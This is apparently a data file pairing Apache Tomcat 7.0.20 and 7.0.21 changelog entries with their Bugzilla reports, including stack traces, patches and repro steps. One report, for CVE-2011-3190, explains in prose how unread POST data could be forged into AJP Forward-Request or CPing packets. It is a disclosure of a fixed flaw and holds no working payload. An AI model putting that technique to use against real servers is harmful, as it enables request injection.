
Aug 23, 2011 5:18:30 PM org.apache.catalina.connector.Connector <init>
SEVERE: Protocol handler instantiation failed
Aug 23, 2011 5:18:30 PM org.apache.tomcat.util.digester.Digester startElement
SEVERE: Begin event threw exception
java.lang.NullPointerException
        at org.apache.catalina.startup.ConnectorCreateRule._setExecutor(ConnectorCreateRule.java:69)
        at org.apache.catalina.startup.ConnectorCreateRule.begin(ConnectorCreateRule.java:63)
        at org.apache.tomcat.util.digester.Digester.startElement(Digester.java:1276)
        at com.sun.org.apache.xerces.internal.parsers.AbstractSAXParser.startElement(AbstractSAXParser.java:501)
        at com.sun.org.apache.xerces.internal.parsers.AbstractXMLDocumentParser.emptyElement(AbstractXMLDocumentParser.java:179)
        at com.sun.org.apache.xerces.internal.impl.XMLDocumentFragmentScannerImpl.scanStartElement(XMLDocumentFragmentScannerImpl.java:1343)
        at com.sun.org.apache.xerces.internal.impl.XMLDocumentFragmentScannerImpl$FragmentContentDriver.next(XMLDocumentFragmentScannerImpl.java:2755)
        at com.sun.org.apache.xerces.internal.impl.XMLDocumentScannerImpl.next(XMLDocumentScannerImpl.java:648)
        at com.sun.org.apache.xerces.internal.impl.XMLDocumentFragmentScannerImpl.scanDocument(XMLDocumentFragmentScannerImpl.java:511)
        at com.sun.org.apache.xerces.internal.parsers.XML11Configuration.parse(XML11Configuration.java:808)
        at com.sun.org.apache.xerces.internal.parsers.XML11Configuration.parse(XML11Configuration.java:737)
        at com.sun.org.apache.xerces.internal.parsers.XMLParser.parse(XMLParser.java:119)
        at com.sun.org.apache.xerces.internal.parsers.AbstractSAXParser.parse(AbstractSAXParser.java:1205)
        at com.sun.org.apache.xerces.internal.jaxp.SAXParserImpl$JAXPSAXParser.parse(SAXParserImpl.java:522)
        at org.apache.tomcat.util.digester.Digester.parse(Digester.java:1537)
        at org.apache.catalina.startup.Catalina.load(Catalina.java:555)
        at org.apache.catalina.startup.Catalina.load(Catalina.java:596)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
        at java.lang.reflect.Method.invoke(Method.java:597)
        at org.apache.catalina.startup.Bootstrap.load(Bootstrap.java:281)
        at org.apache.catalina.startup.Bootstrap.main(Bootstrap.java:449)


Aug 23, 2011 5:18:30 PM org.apache.catalina.startup.Catalina load
WARNING: Catalina.start using conf/server.xml: Error at (104, 66) : null
Aug 23, 2011 5:18:30 PM org.apache.catalina.connector.Connector <init>
SEVERE: Protocol handler instantiation failed
Aug 23, 2011 5:18:30 PM org.apache.tomcat.util.digester.Digester startElement
SEVERE: Begin event threw exception
java.lang.NullPointerException
        at org.apache.catalina.startup.ConnectorCreateRule._setExecutor(ConnectorCreateRule.java:69)
        at org.apache.catalina.startup.ConnectorCreateRule.begin(ConnectorCreateRule.java:63)
        at org.apache.tomcat.util.digester.Digester.startElement(Digester.java:1276)
        at com.sun.org.apache.xerces.internal.parsers.AbstractSAXParser.startElement(AbstractSAXParser.java:501)
        at com.sun.org.apache.xerces.internal.parsers.AbstractXMLDocumentParser.emptyElement(AbstractXMLDocumentParser.java:179)
        at com.sun.org.apache.xerces.internal.impl.XMLDocumentFragmentScannerImpl.scanStartElement(XMLDocumentFragmentScannerImpl.java:1343)
        at com.sun.org.apache.xerces.internal.impl.XMLDocumentFragmentScannerImpl$FragmentContentDriver.next(XMLDocumentFragmentScannerImpl.java:2755)
        at com.sun.org.apache.xerces.internal.impl.XMLDocumentScannerImpl.next(XMLDocumentScannerImpl.java:648)
        at com.sun.org.apache.xerces.internal.impl.XMLDocumentFragmentScannerImpl.scanDocument(XMLDocumentFragmentScannerImpl.java:511)
        at com.sun.org.apache.xerces.internal.parsers.XML11Configuration.parse(XML11Configuration.java:808)
        at com.sun.org.apache.xerces.internal.parsers.XML11Configuration.parse(XML11Configuration.java:737)
        at com.sun.org.apache.xerces.internal.parsers.XMLParser.parse(XMLParser.java:119)
        at com.sun.org.apache.xerces.internal.parsers.AbstractSAXParser.parse(AbstractSAXParser.java:1205)
        at com.sun.org.apache.xerces.internal.jaxp.SAXParserImpl$JAXPSAXParser.parse(SAXParserImpl.java:522)
        at org.apache.tomcat.util.digester.Digester.parse(Digester.java:1537)
        at org.apache.catalina.startup.Catalina.load(Catalina.java:555)
        at org.apache.catalina.startup.Catalina.start(Catalina.java:609)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
        at java.lang.reflect.Method.invoke(Method.java:597)
        at org.apache.catalina.startup.Bootstrap.start(Bootstrap.java:322)
        at org.apache.catalina.startup.Bootstrap.main(Bootstrap.java:450)
Aug 23, 2011 5:18:31 PM org.apache.catalina.startup.Catalina load
WARNING: Catalina.start using conf/server.xml: Error at (104, 66) : null
Aug 23, 2011 5:18:31 PM org.apache.catalina.startup.Catalina start
SEVERE: Cannot start server. Server instance is not configured."|https://bz.apache.org/bugzilla/show_bug.cgi?id=51713
Catalina|Tomcat 7.0.21 (markt)|fix|51739|When using a landing page with FORM authentication ensure that the request has a valid HTTP method. (markt)|If landingpage is a XHTML (JSF/CDI), nullpointer exception.||https://bz.apache.org/bugzilla/show_bug.cgi?id=51739
Coyote|Tomcat 7.0.21 (markt)|fix|51641|Use correct key when removing processor instances from the connections map during clean-up. Patch provided by zhh. (markt)|Http11NioProcessor not correct release|"org.apache.coyote.http11.Http11NioProtocol.Http11ConnectionHandler

code segment:
==================================
        @Override
        public void release(SocketWrapper<NioChannel> socket) {
            Http11NioProcessor processor = connections.remove(socket);
            if (processor != null) {
                processor.recycle();
                recycledProcessors.offer(processor);
            }
        }
==================================

should be:
==================================
        @Override
        public void release(SocketWrapper<NioChannel> socket) {
            Http11NioProcessor processor = connections.remove(socket.getSocket());
            if (processor != null) {
                processor.recycle();
                recycledProcessors.offer(processor);
            }
        }
==================================

type of connections is ConcurrentHashMap<NioChannel, Http11NioProcessor> ,
not ConcurrentHashMap<SocketWrapper<NioChannel>, Http11NioProcessor>."|https://bz.apache.org/bugzilla/show_bug.cgi?id=51641
Coyote|Tomcat 7.0.21 (markt)|fix||More changes to align the code between the different HTTP connectors. (markt)|||
Coyote|Tomcat 7.0.21 (markt)|fix||Ensure AjpMessage headers are correct for the direction of the message. (markt)|||
Coyote|Tomcat 7.0.21 (markt)|code||Code clean-up and re-factoring to reduce duplicate code in the AJP processor implementations. (markt)|||
Coyote|Tomcat 7.0.21 (markt)|add||Detect incomplete AJP messages and reject the associated request if one is found. (markt)|||
Coyote|Tomcat 7.0.21 (markt)|fix|51698|Fix CVE-2011-3190. Prevent AJP message injection. (markt)|ajp CPing/Forward-Request packet forgery, is a design decision? or a security vulnerability?|"Created attachment 27416 [details]
ajp CPing packet forgery example

because the ajp ""Data"" packet no ""CodeType""
and tomcat adopts lazy-reading strategy for reading ajp ""Data"" packetÔºå
(i.e., if you don't invoke request.getParameter(""XXX"")Ôºåtomcat does't read post request ""Data"" packet)

soÔºåthe current ""Data"" packet keeping in the socket inputstreamÔºå
the connection is keep-alive, ajp bio/nio procesor reading the next packetÔºå
this time, is ""Data"" packet„ÄÇ

if the first byte of ""Data"" packet'length is 0x02(Code Type of Forward Request Packet) or 0x0A(Code Type of CPing Packet)Ôºå
then tomcat will be in trouble.

please see the attachments.

firt example: ajp CPing packet forgery example

second example: ajp Forward-Request packet forgery"|https://bz.apache.org/bugzilla/show_bug.cgi?id=51698
Jasper|Tomcat 7.0.21 (markt)|fix|41673|Use platform line-endings when reporting compilation errors. (markt)|Jasper output the message of compiling error using LF(\n) on ANY OS.|"Jasper output the message of compiling error using LF(\n) on ANY OS.
This cannot be correctly displayed with Windows notepad.

I think the line feed code along OS would be better, though I know other text 
editor solves this."|https://bz.apache.org/bugzilla/show_bug.cgi?id=41673
Cluster|Tomcat 7.0.21 (markt)|add|51736|Make rpcTimeout configurable in BackupManager. (kfujino)|Make rpcTimeout configurable in BackupManager.|"Default rpcTimeout that BackupManager sets to AbstractReplicatedMap is 15000 msec.
This is not configurable.

When receiving MapMessage.MSG_START (and after a new member is added), 
publishEntryInfo is called for all sessions where primary and backup node are not included. 
And, the backup node is set to the session.

When only one Tomcat starts in cluster, publishEntryInfo will be called for all sessions. 
As a result, the RPC message has the possibility of the timeout. 

When acquiring session from restarting Tomcat, 
warning of ""Unable to retrieve remote object for key:XXX"" is logged.
And the session cannot be continued. 

I make rpcTimeout configurable in BackupManager.
Additionally, if RPC message timeouted in AbstractReplicatedMap#broadcast, add warning message.

Best Regards."|https://bz.apache.org/bugzilla/show_bug.cgi?id=51736
Web applications|Tomcat 7.0.21 (markt)|fix|51649|Update the documentation web application to include the ThreadLocal leak prevention listener. (markt)|Web documentation about listeners should mention ThreadLocalLeakPreventionListener|"Page 

http://tomcat.apache.org/tomcat-7.0-doc/config/listeners.html

does not say anything about the

http://tomcat.apache.org/tomcat-7.0-doc/api/org/apache/catalina/core/ThreadLocalLeakPreventionListener.html

I guess it should?"|https://bz.apache.org/bugzilla/show_bug.cgi?id=51649
jdbc-pool|Tomcat 7.0.21 (markt)|add||51583 (r1157874, r1162102): Fix shutdown delay in jdbc-pool. (fhanik/kkolinko)|ConnectionPool.close() always waits one second unnecessarily|"As discussed with Filip via mail: (just to do report it officially):

I've encountered an issue on closing the pool:
Closing a ConnectionPool will always take at least one second if more than zero connections have been acquired.
Please have a look at ConnectionPool.java:367 :

                    con = pool.poll(1000, TimeUnit.MILLISECONDS);

Imagine that we've previously fetched the last connection out of the queue.
In this case the that command will cause that we've to wait 1000ms (to return null).

The solution would be easy - just check prior to polling if the pool queue is empty.

The 1 second wait time is really annoying because I am creating and destroying the pool for each junit test which causes that each test will take more than 2 seconds (I am using two pools per test)."|https://bz.apache.org/bugzilla/show_bug.cgi?id=51583
Other|Tomcat 7.0.21 (markt)|fix|51558|Don't force the use of StandardManager when using any of the Tomcat#addWebapp() methods. (markt)|Tomcat Embedded: using tomcat.addWebapp always overrides programmatic context-settings with default values for the context at start of tomcat server|"when i deploy an webapp with a tomcat server, i use the Function ""tomcat.addWebapp"". I looked into the code of this function and it makes the following call:

     ctx.addLifecycleListener(new DefaultWebXmlListener());

When i start tomcat, this DefaultWebXmlListener is activated automatically, and always does the following code, so the manager i set for my context gets overriden with this code:

     public static void initWebappDefaults(Context ctx) {
        ...
        // Sessions
        ctx.setManager( new StandardManager());
        ctx.setSessionTimeout(30);
        ...
     }

so when i set a StandardManager programatically, it gets overriden by this code. The workaround i used, is to unregister the DefaultWebXmlListener, and than add my own context.xml specific settings, like a custom manager for deactivating session persistance:

     Context warContext = tomcat.addWebapp(warContextPath, warLocation);
    
     LifecycleListener[] lclisteners = warContext.findLifecycleListeners();
     LifecycleListener defaultWebXMLListener = null;
     for (int i=0; i < lclisteners.length; i++){
       if (lclisteners[i] instanceof DefaultWebXmlListener){
         defaultWebXMLListener = lclisteners[i];
       }
     }
     warContext.removeLifecycleListener(defaultWebXMLListener);
     ...
     StandardManager manager = new StandardManager();
     manager.setPathname(null); // disable session persistance:
     //manager.setPathname(""SESSIONS.ser"");     
     warContext.setCookies(true);
     warContext.setCrossContext(true);
     warContext.setManager(manager);

i think its a bug that using the ""tomcat.addWebapp"" method makes it impossible to set context.xml specific settings programmatically, because they always get overriden by default values at the tomcat start."|https://bz.apache.org/bugzilla/show_bug.cgi?id=51558
Other|Tomcat 7.0.21 (markt)|fix|51704|Make use of File#mkdirs() more robust. (markt)|Dubious use of mkdirs() return code in juli FileHandler|"File#mkdirs() only returns true if the method created the directory itself.

If mkdirs() returns false, it is still possible for the directory to exist.

Thus the code in FileHandler at [1], i.e.


364     // Create the directory if necessary
365 	File dir = new File(directory);
366 	if (!dir.exists() && !dir.mkdirs()) {
367 	    reportError(""Unable to create ["" + dir + ""]"", null,
368 	    ErrorManager.OPEN_FAILURE);
369 	    writer = null;
370 	    return;
371 	}

can generate an error even though the directory now exists.

It would be safer to code the check as follows:

366 	if (!dir.mkdirs() && !dir.exists()) {

There is no need to call dir.exists() before mkdirs() as mkdirs() does that anyway.

There is similar code at [2] and possibly elsewhere in Tomcat, I did not check.

[1] http://svn.apache.org/viewvc/tomcat/trunk/java/org/apache/juli/FileHandler.java?view=markup#l364

[1] http://svn.apache.org/viewvc/tomcat/trunk/java/org/apache/juli/FileHandler.java?view=markup#l379"|https://bz.apache.org/bugzilla/show_bug.cgi?id=51704
Catalina|Tomcat 7.0.20 (markt)|fix||Corrected missing comma in the value of jarsToSkip property in conf/catalina.properties file, which caused tomcat-jdbc.jar and commons-beanutils*.jar to be not ignored when scanning jars for tag libraries. (kkolinko)|||
Catalina|Tomcat 7.0.20 (markt)|fix|41709|Provide exception messages where no message is provided currently for IllegalStateExcpetions triggered by calling HttpServletResponse methods when the response is committed. (markt)|When calling the API that relates to the buffer after the response is committed, ISE with no messages is thrown.|"After the response is committed, following API throws IllegalStateException.
It's O.K. but the message of the exception is not set.

- HttpServletResponse#resetBuffer
- HttpServletResponse#sendError
- HttpServletResponse#sendRedirect
- HttpServletResponse#setBufferSize

To understand the bug of the application, it is hoped that the message is set 
like other exceptions."|https://bz.apache.org/bugzilla/show_bug.cgi?id=41709
Catalina|Tomcat 7.0.20 (markt)|fix|51509|Fix potential concurrency issue in CSRF prevention filter that may lead to some requests failing that should not. (markt)|Csrf Prevention Filter's LruCache is not thread save|"The LruCache (org.apache.catalina.filters.CsrfPreventionFilter$LruCache) use by Csrf Prevention Filter is base on LinkedHashMap.

From the LinkedHashMap Java Doc:
Note that this implementation is not synchronized.
If multiple threads access a linked hash map concurrently, and at least one of the threads modifies the map structurally, it must be synchronized externally. ...

But the LruCache implementation does not synchronize the access to the map."|https://bz.apache.org/bugzilla/show_bug.cgi?id=51509
Catalina|Tomcat 7.0.20 (markt)|fix|51518|Correct error in web.xml parsing rules for the <others/> tag when using absolute ordering. (markt)|"""/absolute-ordering/name/others"" should not include ""name"" element"|"method:
org.apache.catalina.startup.WebRuleSet.addRuleInstances(Digester digester)


code:
====================================================
digester.addCallMethod(fullPrefix + ""/absolute-ordering/name/others"",
                                   ""addAbsoluteOrderingOthers"");
====================================================


web-common_3_0.xsd
====================================================
 <xsd:complexType name=""absoluteOrderingType"">
    <xsd:annotation>
      <xsd:documentation>

        Please see section 8.2.2 of the specification for details.
        
      </xsd:documentation>
    </xsd:annotation>
    <xsd:choice minOccurs=""0""
                maxOccurs=""unbounded"">
      <xsd:element name=""name""
                   type=""javaee:java-identifierType""
                   minOccurs=""0""
                   maxOccurs=""unbounded""/>
      <xsd:element name=""others""
                   type=""javaee:ordering-othersType""
                   minOccurs=""0""
                   maxOccurs=""1""/>
    </xsd:choice>
  </xsd:complexType>
===================================================="|https://bz.apache.org/bugzilla/show_bug.cgi?id=51518
Catalina|Tomcat 7.0.20 (markt)|add||Move the SetCharacterEncoding filter from the examples web application to the org.apache.catalina.filters package so it is available for all web applications. (markt)|||
Catalina|Tomcat 7.0.20 (markt)|fix|51550|Internal errors in Tomcat components that process requests before they are passed to a web application, such as Authenticators, now return a 500 response rather than a 200 response. (markt)|Empty response instead of error page for IllegalStateException|"IllegalStateException for ""Too many active Sessions"" error on createSession(..) sometines results in empty response with HTTP 200 OK status instead of an error message.

I saw this happening when tomcat trys to create session #(n+1) for a protected area with FORM based authentication and SessionManager with maxActiveSessions=n, not depending on whether StandardManager or PersistentManager is beeing used.

Reproduction:

1) Add webbapps/examples/META-INF/context.xml with following content:
<Context>
        <Manager className=""org.apache.catalina.session.StandardManager""
		 maxActiveSessions=""1"">
	</Manager>
</Context>

2) Restart Tomcat
3) Visit http://localhost:8080/examples/jsp/security/protected/
4) Clear cookies in your browser
5) repeat step 3).

Result:
HTTP/1.1 200 OK
Server: Apache-Coyote/1.1
Cache-Control: private
Expires: Thu, 01 Jan 1970 01:00:00 CET
Transfer-Encoding: chunked
Date: Mon, 25 Jul 2011 13:20:56 GMT

Expected Result:
HTTP/1.1 500 OK
Server: Apache-Coyote/1.1
[...]"|https://bz.apache.org/bugzilla/show_bug.cgi?id=51550
Catalina|Tomcat 7.0.20 (markt)|fix|51555|Allow destroy() to be called on Lifecycle components that are in the initialized state. (markt)|An invalid Lifecycle transition ([before_stop]) for component in state [INITIALIZED]: MapperListener|"Created attachment 27313 [details]
TEST-org.apache.tomcat.util.net.TestXxxEndpoint.BIO.txt

While running TestXxxEndpoint test I observed the following error - see attached log:

An invalid Lifecycle transition was attempted ([before_stop]) for component [org.apache.catalina.connector.MapperListener@e3849c] in state [INITIALIZED]
org.apache.catalina.LifecycleException: An invalid Lifecycle transition was attempted ([before_stop]) for component [org.apache.catalina.connector.MapperListener@e3849c] in state [INITIALIZED]
	at org.apache.catalina.util.LifecycleBase.invalidTransition(LifecycleBase.java:386)
	at org.apache.catalina.util.LifecycleBase.stop(LifecycleBase.java:212)
	at org.apache.catalina.connector.Connector.stopInternal(Connector.java:973)
	at org.apache.catalina.util.LifecycleBase.stop(LifecycleBase.java:225)
	at org.apache.tomcat.util.net.TestXxxEndpoint.testStartStopBindOnStart(TestXxxEndpoint.java:172)


The test case contains two tests.
The first one (on port 8001) succeeded, while the second one (on port 8002) failed with ""Address already in use: JVM_Bind"". This failure to bind to 8002 was unexpected and does not occur during normal run.

While Tomcat was stopping after failed start, the above ""invalid Lifecycle transition"" exception was thrown by MapperListener.


I was testing with BIO connector only, running a single test (test.entry=org.apache.tomcat.util.net.TestXxxEndpoint).

I think that the cause of the startup failure was that I accidentally started two copies of Ant in parallel. In Eclipse it happens if you double-click on ""Run External Tool"" button.



Looking at o.a.catalina.connector.Connector#startInternal(), it does
 - protocolHandler.start();
 - mapperListener.start();

The logs show that protocolHandler.start() call failed. Thus mapperListener.start() was not called.


This second test TestXxxEndpoint.testStartStopBindOnStart() runs with ""bindOnInit"" property of connector set to ""false"". Thus binding failure did not happen in init(), but occurred in start()."|https://bz.apache.org/bugzilla/show_bug.cgi?id=51555
Catalina|Tomcat 7.0.20 (markt)|add||Add x-threadname pattern format token to ExtendedAccessLogValve to log the current request thread name. Based on a patch from Felix Schumacher. (timw)|||
Catalina|Tomcat 7.0.20 (markt)|fix|51584|Ensure file paths are encoded/decoded when translated to/from URLs when working with resources from a Context so special characters don't cause issues. (markt)|Crash (infinite loop) when files starting with '#' are in the library tree|"Situation:
 stray text file in my /WEB-INF/classes/...../ directory named ""#SurveyMain.java#""     ( It was a backup/autosaved source file, and eclipse 'helpfully' deployed it. ) 

 
 causes crash on startup in tomcat 7.0.6, 7.0.19 and 7.0.20-dev (1151601M). - out of memory.


Added this test to .20-dev:

Index: org/apache/catalina/startup/ContextConfig.java
===================================================================
--- org/apache/catalina/startup/ContextConfig.java	(revision 1151601)
+++ org/apache/catalina/startup/ContextConfig.java	(working copy)
@@ -1902,6 +1902,7 @@
                 while (dirs.hasMoreElements()) {
                     String dir = dirs.nextElement();
                     URL dirUrl = new URL(url.toString() + '/' + dir);
+                    System.err.println(""Processing: "" + url.toString() + '/' + dir);
                     processAnnotationsJndi(dirUrl, fragment);
                 }
                 

Printed tons of lines‚Ä¶ at startup‚Ä¶


Processing: jndi:/localhost/cldr-apps/WEB-INF/classes/org/unicode/cldr/web/#SurveyMain.java#/#SurveyMain.java#/#SurveyMain.java#/#SurveyMain.java#/#SurveyMain.java#/#SurveyMain.java#/#SurveyMain.java#/#SurveyMain.java#/#SurveyMain.java#/#SurveyMain.java#/#SurveyMain.java#/#SurveyMain.java#/#SurveyMain.java#/#SurveyMain.java#/#SurveyMain.java#/#SurveyMain.java#/#SurveyMain.java#/#SurveyMain.java#/#SurveyMain.java#/#SurveyMain.java#/#SurveyMain.java#/#SurveyMain.java#/#SurveyMain.java#/#SurveyMain.java#/#SurveyMain.java#/#SurveyMain.java#/#SurveyMain.java#/#SurveyMain.java#/#SurveyMain.java#/#SurveyMain.java#/#SurveyMain.java#/#SurveyMain.java#/#SurveyMain.java#/#SurveyMain.java#/#SurveyMain.java#/#SurveyMain.java#/#SurveyMain.java#/#SurveyMain.java#/#SurveyMain.java#/#SurveyMain.java#/#SurveyMain.java#/#SurveyMain.java#/#SurveyMain.java#/#SurveyMain.java#/#SurveyMain.java#/#SurveyMain.java#/#SurveyMain.java#/#SurveyMain.java#/#SurveyMain.java#/#SurveyMain.java#/#SurveyMain.java#/#SurveyMain.java#/#SurveyMain.java#/#SurveyMain.java#/#SurveyMain.java#/#SurveyMain.java#/#SurveyMain.java#/#SurveyMain.java#/#SurveyMain.java#/#SurveyMain.java#/#SurveyMain.java#/#SurveyMain.java#/#SurveyMain.java#/....

Then crashed as before‚Ä¶

java.lang.OutOfMemoryError: Java heap space
	at java.util.Arrays.copyOfRange(Arrays.java:3209)
	at java.lang.String.<init>(String.java:215)
	at java.lang.StringBuilder.toString(StringBuilder.java:430)
	at java.io.UnixFileSystem.resolve(UnixFileSystem.java:93)
	at java.io.File.<init>(File.java:312)
	at org.apache.naming.resources.FileDirContext.list(FileDirContext.java:871)
	at org.apache.naming.resources.FileDirContext.list(FileDirContext.java:304)
	at org.apache.naming.resources.ProxyDirContext.list(ProxyDirContext.java:506)
	at org.apache.naming.resources.DirContextURLConnection.list(DirContextURLConnection.java:444)
	at org.apache.catalina.startup.ContextConfig.processAnnotationsJndi(ContextConfig.java:1901)
	at org.apache.catalina.startup.ContextConfig.processAnnotationsJndi(ContextConfig.java:1906)
	at org.apache.catalina.startup.ContextConfig.processAnnotationsJndi(ContextConfig.java:1906)
	at org.apache.catalina.startup.ContextConfig.processAnnotationsJndi(ContextConfig.java:1906)
	at org.apache.catalina.startup.ContextConfig.processAnnotationsJndi(ContextConfig.java:1906)
	at org.apache.catalina.startup.ContextConfig.processAnnotationsJndi(ContextConfig.java:1906)
	at org.apache.catalina.startup.ContextConfig.processAnnotationsJndi(ContextConfig.java:1906)
	at org.apache.catalina.startup.ContextConfig.processAnnotationsJndi(ContextConfig.java:1906)
	at org.apache.catalina.startup.ContextConfig.processAnnotationsJndi(ContextConfig.java:1906)
	at org.apache.catalina.startup.ContextConfig.processAnnotationsJndi(ContextConfig.java:1906)
	at org.apache.catalina.startup.ContextConfig.processAnnotationsJndi(ContextConfig.java:1906)
	at org.apache.catalina.startup.ContextConfig.processAnnotationsJndi(ContextConfig.java:1906)
	at org.apache.catalina.startup.ContextConfig.processAnnotationsJndi(ContextConfig.java:1906)
	at org.apache.catalina.startup.ContextConfig.processAnnotationsJndi(ContextConfig.java:1906)
	at org.apache.catalina.startup.ContextConfig.processAnnotationsJndi(ContextConfig.java:1906)
	at org.apache.catalina.startup.ContextConfig.processAnnotationsJndi(ContextConfig.java:1906)
	at org.apache.catalina.startup.ContextConfig.processAnnotationsJndi(ContextConfig.java:1906)
	at org.apache.catalina.startup.ContextConfig.processAnnotationsJndi(ContextConfig.java:1906)
	at org.apache.catalina.startup.ContextConfig.processAnnotationsJndi(ContextConfig.java:1906)
	at org.apache.catalina.startup.ContextConfig.processAnnotationsJndi(ContextConfig.java:1906)
	at org.apache.catalina.startup.ContextConfig.processAnnotationsJndi(ContextConfig.java:1906)
	at org.apache.catalina.startup.ContextConfig.processAnnotationsJndi(ContextConfig.java:1906)
	at org.apache.catalina.startup.ContextConfig.processAnnotationsJndi(ContextConfig.java:1906)



I think the problem is that the URL generated contains a '#' and so file:// interprets it as a fragment and not as a path.

Quick patch:

Index: java/org/apache/catalina/startup/ContextConfig.java
===================================================================
--- java/org/apache/catalina/startup/ContextConfig.java	(revision 1151601)
+++ java/org/apache/catalina/startup/ContextConfig.java	(working copy)
@@ -1901,7 +1901,11 @@
                 Enumeration<String> dirs = dcUrlConn.list();
                 while (dirs.hasMoreElements()) {
                     String dir = dirs.nextElement();
+                    if(dir.startsWith(""#"")) {
+                        continue;
+                    }
                     URL dirUrl = new URL(url.toString() + '/' + dir);
+                    //System.err.println(""Processing: "" + dirUrl.toString());
                     processAnnotationsJndi(dirUrl, fragment);
                 }"|https://bz.apache.org/bugzilla/show_bug.cgi?id=51584
Catalina|Tomcat 7.0.20 (markt)|fix|51586|Expand error handling to cover anything that is recoverable (or might be recoverable) when loading classes during HandlesTypes processing. (markt)|ContextConfig.checkHandlesTypes() doesn't check for VerifyError when loading class|"I've recently upgraded to Tomcat 7 and used to run with metadata-complete=""true"" in my web.xml.  With Servlet 3 I decided I'd try some of the annotation features.  When I turned off metadata-complete I got a VerifyError trying to load one of my classes.  This class is meant to only work on Tomcat 6 so the fact Tomcat 7 cannot load this class is expected.  What is not expected is that Tomcat 7 doesn't just ignore the error and continue scanning for annotations.  Looking in ContextConfig.checkHandlesTypes() I checks for virtually every type of loading failure except VerifyError.  Perhaps VerifyError should be added to this list?

java.lang.VerifyError: class org.lds.stack.tomcat.decrypt.DecryptingStandardContext overrides final method start.()V
	at java.lang.ClassLoader.defineClass1(Native Method)
	at java.lang.ClassLoader.defineClassCond(ClassLoader.java:631)
	at java.lang.ClassLoader.defineClass(ClassLoader.java:615)
	at java.security.SecureClassLoader.defineClass(SecureClassLoader.java:141)
	at java.net.URLClassLoader.defineClass(URLClassLoader.java:283)
	at java.net.URLClassLoader.access$000(URLClassLoader.java:58)
	at java.net.URLClassLoader$1.run(URLClassLoader.java:197)
	at java.security.AccessController.doPrivileged(Native Method)
	at java.net.URLClassLoader.findClass(URLClassLoader.java:190)
	at java.lang.ClassLoader.loadClass(ClassLoader.java:306)
	at java.lang.ClassLoader.loadClass(ClassLoader.java:247)
	at java.lang.Class.forName0(Native Method)
	at java.lang.Class.forName(Class.java:247)
	at org.apache.catalina.loader.WebappClassLoader.loadClass(WebappClassLoader.java:1665)
	at org.apache.catalina.loader.WebappClassLoader.loadClass(WebappClassLoader.java:1523)
	at org.apache.catalina.startup.ContextConfig.checkHandlesTypes(ContextConfig.java:2006)
	at org.apache.catalina.startup.ContextConfig.processAnnotationsStream(ContextConfig.java:1969)
	at org.apache.catalina.startup.ContextConfig.processAnnotationsJar(ContextConfig.java:1858)
	at org.apache.catalina.startup.ContextConfig.processAnnotationsUrl(ContextConfig.java:1826)
	at org.apache.catalina.startup.ContextConfig.processAnnotations(ContextConfig.java:1812)
	at org.apache.catalina.startup.ContextConfig.webConfig(ContextConfig.java:1306)
	at org.apache.catalina.startup.ContextConfig.configureStart(ContextConfig.java:896)
	at org.apache.catalina.startup.ContextConfig.lifecycleEvent(ContextConfig.java:322)
	at org.apache.catalina.util.LifecycleSupport.fireLifecycleEvent(LifecycleSupport.java:119)
	at org.apache.catalina.util.LifecycleBase.fireLifecycleEvent(LifecycleBase.java:89)
	at org.apache.catalina.core.StandardContext.startInternal(StandardContext.java:5103)
	at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:145)
	at org.apache.catalina.core.ContainerBase.addChildInternal(ContainerBase.java:812)
	at org.apache.catalina.core.ContainerBase.addChild(ContainerBase.java:787)
	at org.apache.catalina.core.StandardHost.addChild(StandardHost.java:607)
	at org.apache.catalina.startup.HostConfig.deployDescriptor(HostConfig.java:633)
	at org.apache.catalina.startup.HostConfig.deployDescriptors(HostConfig.java:558)
	at org.apache.catalina.startup.HostConfig.deployApps(HostConfig.java:468)
	at org.apache.catalina.startup.HostConfig.start(HostConfig.java:1322)
	at org.apache.catalina.startup.HostConfig.lifecycleEvent(HostConfig.java:311)
	at org.apache.catalina.util.LifecycleSupport.fireLifecycleEvent(LifecycleSupport.java:119)
	at org.apache.catalina.util.LifecycleBase.fireLifecycleEvent(LifecycleBase.java:89)
	at org.apache.catalina.util.LifecycleBase.setStateInternal(LifecycleBase.java:379)
	at org.apache.catalina.util.LifecycleBase.setState(LifecycleBase.java:324)
	at org.apache.catalina.core.ContainerBase.startInternal(ContainerBase.java:1041)
	at org.apache.catalina.core.StandardHost.startInternal(StandardHost.java:774)
	at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:145)
	at org.apache.catalina.core.ContainerBase.startInternal(ContainerBase.java:1033)
	at org.apache.catalina.core.StandardEngine.startInternal(StandardEngine.java:291)
	at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:145)
	at org.apache.catalina.core.StandardService.startInternal(StandardService.java:443)
	at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:145)
	at org.apache.catalina.core.StandardServer.startInternal(StandardServer.java:727)
	at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:145)
	at org.apache.catalina.startup.Catalina.start(Catalina.java:621)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
	at java.lang.reflect.Method.invoke(Method.java:597)
	at org.apache.catalina.startup.Bootstrap.start(Bootstrap.java:322)
	at org.apache.catalina.startup.Bootstrap.main(Bootstrap.java:450)"|https://bz.apache.org/bugzilla/show_bug.cgi?id=51586
Catalina|Tomcat 7.0.20 (markt)|fix|51588|Make it easier to extend the AccessLogValve to add support for custom elements. (markt)|Change access modifiers in AccessLogValve to make it easier to extend|I'm adding some fields to a subclass of org.apache.catalina.valves.AccessLogValve but createLogElements() is the closest extension point available. Rather than reimplement the functionality there it would be preferable if both of the createAccessLogElement() methods were protected rather than private then it's a simple method of matching the char you want to use and falling back to super.createAccessLogElement().|https://bz.apache.org/bugzilla/show_bug.cgi?id=51588
Catalina|Tomcat 7.0.20 (markt)|fix||Ensure that calls to StandardWrapper methods() that may trigger creation of a Servlet instance always do so in way that correctly instantiates a Servlet instance. (markt)|||
